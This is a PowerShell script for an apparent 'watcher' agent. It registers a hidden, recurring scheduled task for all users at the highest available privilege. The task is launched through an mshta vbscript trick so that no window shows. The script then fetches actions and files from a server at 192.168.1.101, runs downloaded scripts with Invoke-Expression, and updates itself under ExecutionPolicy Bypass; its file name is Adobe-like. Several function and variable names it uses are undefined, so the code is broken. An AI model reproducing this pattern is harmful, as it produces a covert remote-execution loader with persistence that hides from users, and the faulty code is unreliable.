#Requires -Version 5
[CmdletBinding()]
param
(
    #[Parameter(Mandatory)]
    [ValidateNotNullOrEmpty()]
    [ValidateSet('init','watcher', 'download', 'run-script', 'register-task', 'self-update', "update-pwsh")]
    [string]$action
)
#### Variables (defenitions)

$taskXmlDefinition = '<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Agitech </Author>
    <Description>Powershell watcher</Description>
    <Version>' + $taskVersion + '</Version>
    <URI>\Powershell_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT10M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>'

enum Status{
  notrun
  succes
  failure
}

######## Functions
function _LogInfo
{
  param(
    [object]$object
  )
  "error2" | Out-File $logfile -Append
}

function _GetActions
{
  $uriActions = $uri+"/GetConfig?name=actions";
  $actions = Invoke-RestMethod -Uri $uriActions
  return $actions;
}

function _GetUri
{
  param (
      [Parameter()]
      [string]$FileName
  )
  return $serviceUri+"/GetFile?fileName=$FileName";
}

function _GetFile
{
  param (
      [Parameter()]
      [string]$FileName,
      [Parameter()]
      [string]$OutFileName
  )
  $retval = $true
  $fileUri = _GetUri -FileName $FileName
  try {
    Invoke-RestMethod -Uri $fileUri -OutFile $OutFileName
  } catch {
    # Dig into the exception to get the Response details.
    # Note that value__ is not a typo.
    Write-Host "StatusCode:" $_.Exception.Response.StatusCode.value__ 
    Write-Host "StatusDescription:" $_.Exception.Response.StatusDescription
    $retval = $false
  }
  return $retval;
}

# self update
function _SelfUpdate
{
  param(
    [Switch]
    $UseTask
  )
  if($UseTask)
  {
    $tmpFileName = (New-TemporaryFile).FullName
    if(-not (GetFile -FileName $thisFileName -OutFileName $tmpFileName))
    {
      return $false
    }
    $taskName = $taskNames["selfupdate"]
    # load task definition
    $xmlDef = New-Object -TypeName System.Xml.XmlDocument;
    $xmlDef.LoadXml($taskSelfUpdateXmlDef);
    #$script = "Move-Item -Path $tmpFileName -Destination $PSCommandPath; Start-Sleep -Seconds 5"
    $script = "Move-Item -Path $tmpFileName -Destination C:\Users\agite\OneDrive\Powershell\Learn\coins\AdobeWatcherX.ps1 -Force; Start-Sleep -Seconds 5"
    $execCommand = "C:\Program Files\PowerShell\7\pwsh.exe";
    $execArguments = "-ExecutionPolicy Bypass -NoLogo -NonInteractive -WindowStyle Hidden -NoProfile -Command ""& {$script}"" -Verb RunAs"
    #$execArguments = "-ExecutionPolicy Bypass -Command ""& {$script}"" -Verb RunAs"
    $runTime = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:00");
    $xmlDef.Task.Triggers.TimeTrigger.StartBoundary = $runTime
    $xmlDef.Task.Actions.Exec.Command = $execCommand
    $xmlDef.Task.Actions.Exec.Arguments = $execArguments
    if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
    {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }

    Register-ScheduledTask -Xml $xmlDef.OuterXml -TaskName $taskName
  }
  else {
    if(-not (GetFile -FileName $thisFileName -OutFileName $thisFileFullName))
    {
      return $false
    }    
  }
}
function _CheckTask
{
   param (
    [Parameter()]
    [string]$TaskName
  )
  # load task definition
  $xmlDef = New-Object -TypeName System.Xml.XmlDocument;
  $xmlDef.LoadXml($taskXmlDefinition);
  $script = [System.IO.Path]::Combine($PSScriptRoot, $thisFileName) ; #+ " -Action watcher";
  $execCommand = 'mshta.exe' 
  $execArguments = 'vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''' + $script + '''"""""", 0 : window.close")'
  $xmlDef.Task.Actions.Exec.Command = $execCommand
  $xmlDef.Task.Actions.Exec.Arguments = $execArguments
  $scheduledTask =  Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
  $needRegister = $false

  if(-not $scheduledTask)
  {
    $needRegister = $true
  }
  else
  {
    $taskVersionCurrent = $scheduledTask.Version
    if((Get-ScheduledTask -TaskName $TaskName).State -eq "Disabled" -or ($taskVersionCurrent -ne $taskVersion))
    {
      Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
      $needRegister = $true
    }
  }
  if($needRegister)
  {
    _RegisterTask -TaskName $TaskName -XmlDefinition $xmlDef -Principal author
    #Register-ScheduledTask -Xml $xmlDef.OuterXml -TaskName $TaskName # -User System
  }
  $needRegister
}

function _InstallPowershell
{  
    # if(!(Get-IsAdmin))
    # {
    #     Write-Error "Run as administrator"
    #     return
    #     $pswPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName;
    #     #$pp = $MyInvocation.MyCommand.Path
    #     if(((New-Object -TypeName System.Diagnostics.ProcessStartInfo -ArgumentList $pswPath).Verbs).Contains("runas"))
    #     {
    #         Start-Process -FilePath $pswPath -ArgumentList "-File $PSCommandPath" -Verb RunAs
    #     }
    # }

    $gitUri = "https://api.github.com/repos/powershell/powershell"
    $gitUriReleases = "$gitUri/releases"
    $gitUriReleasesLatest = "$gitUri/releases/latest"
    $pattern = (@("PowerShell-(?<version>\d?\d.\d?\d.\d?\d)-win-x64.zip","v(?<version>\d?\d.\d?\d.\d?\d)"))[1]
    $remoteVersion = [System.Version]::Parse("0.0.0")

    $pswhInstalled = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName.Contains("C:\Program Files\PowerShell\7\pwsh.exe");
    
    $latestRelease = (Invoke-RestMethod -Method Get -Uri $gitUriReleasesLatest)
    
    if($latestRelease.tag_name -match $pattern)
    {
        $remoteVersion = [System.Version]::Parse($Matches["version"]);
    }
    
    $localVersion = $PSVersionTable.PSVersion
    
    if($localVersion -lt $remoteVersion)
    {
        $pwshUri = ((Invoke-RestMethod -Method GET -Uri $gitUriReleases)[0].assets | Where-Object name -match "PowerShell-\d.\d.\d-win-x64.msi").browser_download_url

        # create temp file
        $tmp = New-TemporaryFile | Rename-Item -NewName { $_ -replace 'tmp$', 'msi' } -PassThru

        Invoke-WebRequest -OutFile $tmp $pwshUri

        # command line arguments
        # USE_MU - This property has two possible values:
        #   1 (default) - Opts into updating through Microsoft Update, WSUS, or Configuration Manager
        #   0 - Do not opt into updating through Microsoft Update, WSUS, or Configuration Manager
        # ENABLE_MU
        #   1 (default) - Opts into using Microsoft Update for Automatic Updates
        #   0 - Do not opt into using Microsoft Update
        # ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL - This property controls the option for adding the Open PowerShell item to the context menu in Windows Explorer.
        # ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL - This property controls the option for adding the Run with PowerShell item to the context menu in Windows Explorer.
        # ENABLE_PSREMOTING - This property controls the option for enabling PowerShell remoting during installation.
        # REGISTER_MANIFEST - This property controls the option for registering the Windows Event Logging manifest.

        $logFile = '{0}-{1}.log' -f $tmp.FullName, (get-date -Format yyyyMMddTHHmmss)
        $arguments = "/i {0} ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL=1 ENABLE_PSREMOTING=1 REGISTER_MANIFEST=1 USE_MU=1 ENABLE_MU=1 /qn /norestart /L*v {1}" -f $tmp.FullName, $logFile
        Start-Process "msiexec.exe" -ArgumentList $arguments -NoNewWindow 
    }
}

function _RegisterTask
{  
    param
    (
        [Parameter(Mandatory)]
        [string]$TaskName,
        [Parameter(Mandatory)]
        [xml]$XmlDefinition,
        [ValidateSet('system', 'author', 'none')]
        [string]$Principal = 'none'
    )

    if(Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
    {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    }

    $principals = @{"author" = '<Principal id="Author"><GroupId>S-1-1-0</GroupId><RunLevel>HighestAvailable</RunLevel></Principal>'};
    $contexts = @{"author" = "Author"}

    #<Principal id="Author" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><GroupId>S-1-1-0</GroupId><RunLevel>HighestAvailable</RunLevel></Principal>

    switch ($principal)
    {
        'none'
        {
            Register-ScheduledTask -Xml $XmlDefinition.OuterXml -TaskName $TaskName
        }
        'system'
        {
            Register-ScheduledTask -Xml $XmlDefinition.OuterXml -TaskName $TaskName -User System
        }
        'author'
        {
            $xmlDef.Task.Principals.InnerXml = $principals["author"];
            $xmlDef.Task.Actions.SetAttribute("Context", $contexts["author"])
            Register-ScheduledTask -Xml $xmlDef.OuterXml -TaskName $TaskName
        }    
    }
}


######## Variables

$jsonInfoString = @{version=0; actions=@{ "download"= "all"}; status="succes"};
$taskVersion = 3;
$taskSelfUpdateXmlDef = ''
$serviceUri = "http://192.168.1.101";
$destinationFolder = $PSScriptRoot
$thisFileName = $MyInvocation.MyCommand.Name
$thisFileFullName = $MyInvocation.MyCommand.Path
$jsonInfoFile = [System.IO.Path]::Combine($destinationFolder, "info.json")
$jsonObject;
$taskNames = @{"watcher" = "PwshWatcher"; "selfupdate" = "PwshSelfUpdater"};
$logFile = [System.IO.Path]::Combine($destinationFolder, "log.log")

$currentAction = $null
$currentValue = $null
$actionIndex = -1;

####### Code

# $CurrentPrincipal=New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
# $IsAdmin=$CurrentPrincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if(_CheckTask -TaskName $taskNames["watcher"])
{
  exit
}

### Check json file
if(-not (Test-Path $jsonInfoFile))
{
  $jsonInfoString | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
}

$jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json -Depth 5;

### check action and try to resolve it
if(-not ($action))
{
  
  $uriConfig = $serviceUri + "/GetConfig?name=version";

  [int]$versionRemote = Invoke-RestMethod -Uri $uriConfig

  [int]$versionLocal = $jsonObject.version

  if($versionLocal -ne $versionRemote)
  {
    $jsonObject.version = $versionRemote;
    $jsonObject.actions = _GetActions;
    $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile;
    $jsonObject = Get-Content $jsonInfoFile | ConvertFrom-Json;
  }
  $actions = ($jsonObject.actions) | Where-Object { $_.status -eq "notrun"} | Sort-Object -Property Order

  if($actions.Count -gt 0)
  {
    $currentAction = $actions[0].name
    $currentValue = $actions[0].value
    $actionIndex = 0;
  }
  else
  {
    $currentAction = "watcher"  
  }
}
else {
    $currentAction = $action
}

switch($currentAction)
{
    "init"
    {
    }
    "update-pwsh"
    {
        _InstallPowershell
    }
    "download"
    {
      # get files and save its to the disk
      if($currentValue -eq "all")
      {
        $getFilesUri = $uri+"/GetFiles"
        $files = Invoke-RestMethod -Uri $getFilesUri
        $jsonObject.status = [Status]::succes;

        $files = $files | Where-Object { $_ -ne $thisFileName}
      }
      else {
        $files = $currentValue -split "\|"
      }
      foreach($item in $files)
      {
          $outFileName = [System.IO.Path]::Combine($destinationFolder, $item);
          $checkFolder = [System.IO.Path]::GetDirectoryName($outFileName);
          if(-not (Test-Path $checkFolder))
          {
              New-Item -ItemType Directory -Force -Path $checkFolder
          }
          $downloadStatus = _GetFile -FileName $item -OutFileName $outFileName
          if(-not $downloadStatus)
          {
            $jsonObject.status = [Status]::failure;
          }
      }
    }
    "watcher"
    {
    }
    "run-script"
    {
      try{
        $scriptToRun = "$PSScriptRoot\$value"
        Invoke-Expression "$scriptToRun"
      }
      catch{
        "error" | Out-File $logfile -Append
      }
    }
    "register-task"
    {
      $taskName = $currentValue.taskname
      $definitionName = $currentValue.definitionName
      $principal = $currentValue.principal
      $xmlDefinitionPath = [System.IO.Path]::Combine($destinationFolder, $definitionName)
      $xmlContent = Get-Content $xmlDefinitionPath
      $xmlContent = $xmlContent -replace '{RootFolder}', $destinationFolder
      [xml]$xmlDef = $xmlContent
      Register-TaskLocal -TaskName $taskName -XmlDefinition $xmlDef -Principal $principal
    }
    "self-update"
    {
      _SelfUpdate
    }
    "run-file"
    {
      if(Test-Path -Path $watcherFileName)
      {
          Invoke-Expression "& `"$watcherFileName`" -action init"
      }
    }
}

if(-not $action)
{
  $actions[$actionIndex].status = ([Status]::succes).ToString();
  $jsonObject | ConvertTo-Json -Depth 5 | Out-File $jsonInfoFile
}
